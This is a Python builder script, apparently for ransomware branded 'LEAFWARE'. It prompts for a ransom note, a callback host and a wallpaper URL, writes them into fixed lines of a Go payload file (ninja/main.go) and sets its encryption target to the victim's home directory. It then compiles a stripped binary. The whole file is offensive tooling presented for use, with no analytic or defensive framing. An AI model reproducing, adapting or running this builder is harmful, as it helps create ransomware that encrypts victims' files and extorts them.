from cprint import *
import os


Home_address = str(os.getcwd())

banner = """
'##:::::::'########::::'###::::'########:'##:::'##:'##:::::'##::::'###::::'########::'########:
 ##::::::: ##.....::::'## ##::: ##.....::. ##:'##:: ##:'##: ##:::'## ##::: ##.... ##: ##.....::
 ##::::::: ##::::::::'##:. ##:: ##::::::::. ####::: ##: ##: ##::'##:. ##:: ##:::: ##: ##:::::::
 ##::::::: ######:::'##:::. ##: ######:::::. ##:::: ##: ##: ##:'##:::. ##: ########:: ######:::
 ##::::::: ##...:::: #########: ##...::::::: ##:::: ##: ##: ##: #########: ##.. ##::: ##...::::
 ##::::::: ##::::::: ##.... ##: ##:::::::::: ##:::: ##: ##: ##: ##.... ##: ##::. ##:: ##:::::::
 ########: ########: ##:::: ##: ##:::::::::: ##::::. ###. ###:: ##:::: ##: ##:::. ##: ########:
........::........::..:::::..::..:::::::::::..::::::...::...:::..:::::..::..:::::..::........::
"""
cprint.warn(banner)
path = Home_address + "\\ninja"
cprint.info("Current Dir : " + os.getcwd())

def writeline(linenumber,content):
    homepath = str(os.getcwd())
    a_file = open(homepath + "\\ninja\\main.go", "r")
    list_of_lines = a_file.readlines()
    list_of_lines[linenumber] = content + "\n"
    a_file = open(homepath + "\\ninja\\main.go", "w")
    a_file.writelines(list_of_lines)
    a_file.close()

def startbuilding(deathnote,cryptpath,host,wallpaper):
    writeline(94, '	var note = "'+deathnote+'"')
    writeline(75, '	url := "'+host+'"')
    writeline(71, '	wallpaper.Change("'+wallpaper+'")')
    writeline(29, '	var cryptpath string = userdir.HomeDir')
    os.system('go build -ldflags "-s -w" ' + str(os.getcwd()) + "\\ninja\\main.go")
    

print("Enter the Note : ", end="")
deathnote = input("")
#print("Enter the cryptpath : ", end="")
#cryptpath = input("")

print("Enter the host : ", end="")
host = input("")
print("Enter the wallpaper url : ", end="")
wallpaper = input("")

startbuilding(deathnote,"cryptpath",host,wallpaper)